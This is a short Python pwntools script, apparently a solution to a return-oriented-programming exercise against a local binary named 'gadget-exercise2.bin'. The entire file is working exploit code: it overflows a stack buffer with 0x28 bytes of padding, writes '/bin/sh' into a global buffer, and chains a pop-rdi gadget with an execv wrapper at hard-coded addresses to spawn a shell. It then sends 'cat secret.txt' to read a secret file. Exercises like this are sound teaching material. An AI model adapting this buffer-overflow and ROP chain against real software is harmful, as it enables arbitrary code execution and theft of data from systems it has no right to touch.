#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    p = process("./gadget-exercise2.bin")

    rop = ROP("./gadget-exercise2.bin")
    print(rop.rdi)
    rdi_gadget = p64(0x4007b3)

    safe = p64(0x400697)
    vuln = p64(0x4006c4)
    global_buf = p64(0x601080)
    execv_wrapper = p64(0x400676)

    print(p.recvuntil(b"stack buffer: "))
    p.send(b"A" * 0x28 + safe + vuln)
    print(p.recvuntil(b"global buffer: "))
    p.sendline(b"/bin/sh\x00")
    print(p.recvuntil(b"stack buffer: "))
    p.send(b"A" * 0x28 + rdi_gadget + global_buf + execv_wrapper)

    # Spawn shell.
    sleep(0.2)
    p.sendline(b"cat secret.txt")
    print(p.recvline())

if __name__ == "__main__":
    exploit()